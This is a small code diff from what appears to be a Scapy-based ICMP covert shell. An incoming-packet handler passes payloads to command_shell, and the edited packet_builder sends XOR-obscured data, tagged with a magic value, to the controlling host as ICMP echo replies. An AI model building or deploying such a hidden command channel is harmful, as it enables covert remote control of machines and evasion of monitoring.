@@ -45,7 +45,9 @@ def action(pkt):
 			command_shell(buff[8:])
 
 def packet_builder(data):
-	return Ether() / IP(dst=source) / ICMP() / (XOR(server_magic + data))
+	packet = Ether() / IP(dst=source) / ICMP(type=0) / (XOR(server_magic + data))
+	#packet.type = 0
+	return packet
 
 def XOR(p):
         buff = ""
